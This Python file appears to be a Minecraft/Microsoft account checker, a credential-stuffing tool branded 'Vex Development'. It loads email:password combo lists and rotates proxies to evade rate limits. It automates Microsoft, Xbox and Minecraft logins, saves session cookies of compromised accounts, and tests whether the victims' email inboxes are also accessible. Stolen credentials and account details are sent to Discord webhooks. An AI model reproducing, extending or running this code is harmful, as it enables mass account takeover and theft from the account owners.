import discord
from discord.ext import commands
import asyncio
import threading
import queue
import time
from datetime import datetime
import discord
from discord.ext import commands
import asyncio
import threading
import queue
import time
from datetime import datetime, timezone
import os
from dotenv import load_dotenv
import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar

# Linux-specific imports
try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'

class LinuxUtils:
    @staticmethod
    def set_title(title):
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

utils = LinuxUtils()

class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library not available. Ban checking will be disabled.")

logo = Fore.YELLOW+'''
\n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
unbanned, banned_count = 0, 0
session_webhook_url = None
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors, session_webhook_url
        try:
            webhook_url = config.get('webhook') or session_webhook_url
            
            if str(self.banned).lower() == "false" and config.get('UnbannedWebhook'):
                webhook_url = config.get('UnbannedWebhook')
            elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown" and config.get('BannedWebhook'):
                webhook_url = config.get('BannedWebhook')

            if not webhook_url:
                return

            if config.get('embed') == True:
                embed_color = 0
                if str(self.banned).lower() == "false":
                    embed_color = 0
                elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown":
                    embed_color = 0
                
                payload = {
                "username": "Vex Development",
                "avatar_url": f"https://mc-heads.net/avatar/{self.name}",
                "embeds": [
                    {
                    "author": {"name": "Vex Development", "url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"},
                    "title": self.name,
                    "color": 37166,
                    "fields": [
                                {"name": "<a:mail:1415294347162681355> Email", "value": f"||{self.email}||", "inline": True},
                                {"name": "<a:password:1415294427752038511> Password", "value": f"||{self.password}||", "inline": True},
                                {"name": "<a:banned:1415293976445194243> Banned", "value": f"{self.banned or 'Unknown'}", "inline": True},
                                {"name": "<a:hypixel:1415293267804815391> Hypixel Name", "value": self.hypixl or "N/A", "inline": True},
                                {"name": "<a:name:1415295283948027924> Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                                {"name": "<a:ms_coin:1415293380690186240> Hypixel Level", "value": self.level or "N/A", "inline": True},
                                {"name": "<a:cape:1415293674647982121> Capes", "value": f"{self.capes or 'None'} | Optifine: {self.cape or 'No'}", "inline": True},
                                {"name": "<a:mcfa:1415293802402414634> Account Type", "value": self.type or "N/A", "inline": True},
                                {"name": "<a:MicrosoftMojang:1415294909006745691> Combo", "value": f"||{self.email}:{self.password}||", "inline": True},
                                {"name": "<:emoji_1:1450698111172214805> First Login", "value": self.firstlogin or "N/A", "inline": True},
                                {"name": "<2:emoji_2:1450698140784132226> Last Login", "value": self.lastlogin or "N/A", "inline": True},
                                {"name": "<:emoji_3:1450698187277864960> Last Name Change", "value": self.lastchanged or "N/A", "inline": True},
                                {"name": "<a:emoji_4:1450698212112465971> Skyblock Coins", "value": self.sbcoins or "N/A", "inline": True},
                                {"name": "<a:emoji_7:1450698237060321301> Bedwars Stars", "value": self.bwstars or "N/A", "inline": True},
                                {"name": "<:emoji_6:1450698265011032127> Email Access", "value": self.access or "N/A", "inline": True},
                            ],
                            "thumbnail": {"url": f"https://mc-heads.net/avatar/{self.name}"},
                            "footer": {
                                "text": "Vex Development | made with ❤️ by Vortex",
                                "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                            }
                        }
                    ]
                }
            else:
                payload = {
                    "content": config.get('message')
                        .replace("<email>", self.email)
                        .replace("<password>", self.password)
                        .replace("<name>", self.name or "N/A")
                        .replace("<hypixel>", self.hypixl or "N/A")
                        .replace("<level>", self.level or "N/A")
                        .replace("<firstlogin>", self.firstlogin or "N/A")
                        .replace("<lastlogin>", self.lastlogin or "N/A")
                        .replace("<ofcape>", self.cape or "N/A")
                        .replace("<capes>", self.capes or "N/A")
                        .replace("<access>", self.access or "N/A")
                        .replace("<skyblockcoins>", self.sbcoins or "N/A")
                        .replace("<bedwarsstars>", self.bwstars or "N/A")
                        .replace("<banned>", self.banned or "Unknown")
                        .replace("<namechange>", self.namechanged or "N/A")
                        .replace("<lastchanged>", self.lastchanged or "N/A")
                        .replace("<type>", self.type or "N/A"),
                    "username": "Vex Development"
                }

            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1

    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def ban(self, session):
        global errors, unbanned, banned_count
        if config.get('hypixelban'):
            if not minecraft_available:
                self.banned = "Unknown (Library not available)"
                return
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            original_socket = socket.socket
            max_ban_retries = maxretries if maxretries > 0 else 3
            while tries < max_ban_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    global unbanned, banned_count
                    try:
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "You are permanently banned from this server!" in str(data):
                            self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "The Hypixel Alpha server is currently closed!" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "Failed cloning your SkyBlock data" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "kicked" in str(data).lower() or "disconnect" in str(data).lower():
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        else:
                            try:
                                self.banned = ''.join(item["text"] for item in data.get("extra", []))
                            except:
                                self.banned = str(data)
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                    except Exception as e:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    global unbanned
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                proxy_was_set = False
                connection_error = None
                try:
                    proxies_to_use = banproxies if len(banproxies) > 0 else proxylist
                    if len(proxies_to_use) > 0:
                        proxy = random.choice(proxies_to_use)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                        proxy_was_set = True
                    elif config.get('proxylessban') != True:
                        self.banned = "Unknown (No proxy)"
                        return
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        max_wait = 3000
                        while self.banned == None and c < max_wait:
                            time.sleep(.01)
                            c+=1
                        try:
                            connection.disconnect()
                        except:
                            pass
                    except Exception as conn_error:
                        connection_error = str(conn_error)
                    finally:
                        sys.stderr = original_stderr
                        if proxy_was_set:
                            socket.socket = original_socket
                            socks.set_default_proxy()
                except Exception as outer_error:
                    connection_error = str(outer_error)
                    if proxy_was_set:
                        socket.socket = original_socket
                        socks.set_default_proxy()
                if self.banned != None: 
                    break
                tries+=1
                if tries < max_ban_retries:
                    time.sleep(0.5)
            socket.socket = original_socket
            socks.set_default_proxy()
            if self.banned == None:
                self.banned = "False"
                with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                unbanned += 1
                try:
                    self.save_cookies('Unbanned')
                except:
                    pass

    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxies = getproxy()
        retries += 1
        tries += 1
    raise Exception("Failed to get authentication URL after max retries")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxies = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=15)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                loop_tries += 1
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy()
            loop_tries += 1
            continue

def checkmc(session, email, password, token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
        except:
            retries += 1
            session.proxies = getproxy()
            loop_tries += 1
            continue
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]", session)
                    CAPTURE.handle(session)
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy()
            if len(proxylist) < 1: time.sleep(20)
            loop_tries += 1
            continue
        else:
            return False
    return False

def mc_token(session, uhs, xsts_token):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: time.sleep(20)
                tries += 1
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy()
            tries += 1
            continue
    return None

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load(filename):
    global Combos, fname
    if filename is None:
        return False, "Invalid File."
    else:
        fname = os.path.splitext(os.path.basename(filename))[0]
        try:
            with open(filename, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                return True, f"[{str(len(lines) - len(Combos))}] Dupes Removed.\n[{len(Combos)}] Combos Loaded."
        except:
            return False, "Your file is probably harmed."

def Proxys(file_path):
    global proxylist
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    proxylist.append(proxyline)
                except: pass
        return True, f"Loaded [{len(proxylist)}] proxies."
    except Exception:
        return False, "Your file is probably harmed."

def getproxy():
    if proxytype == "'4'":
        return None
    if len(proxylist) == 0:
        return None
    try:
        proxy = random.choice(proxylist)
        if isinstance(proxy, dict):
            return proxy
        if proxytype == "'1'" or proxytype == "'5'":
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype == "'2'":
            return {'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy}
        elif proxytype == "'3'":
            return {'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy}
        else:
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
    except:
        return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        email = split[0]
        password = split[1]
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    default_config = {
        'Settings': {
            'Webhook': 'paste your discord webhook here',
            'BannedWebhook': 'paste banned accounts webhook',
            'UnbannedWebhook': 'paste unbanned accounts webhook',
            'Embed': True,
            'Max Retries': 5,
            'Proxyless Ban Check': True,
            'WebhookMessage': ''' ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5
        },
        'Auto': {
            'Set Name': True,
            'Name': 'VaultCore',
            'Set Skin': True,
            'Skin': 'https://s.namemc.com/i/bc8429d1f2e15539.png',
            'Skin Variant': 'classic'
        },
        'Captures': {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'Payment': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('BannedWebhook', str(read_config['Settings']['BannedWebhook']))
    config.set('UnbannedWebhook', str(read_config['Settings']['UnbannedWebhook']))
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('name', str(read_config['Auto']['Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skin', str(read_config['Auto']['Skin']))
    config.set('variant', str(read_config['Auto']['Skin Variant']))
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
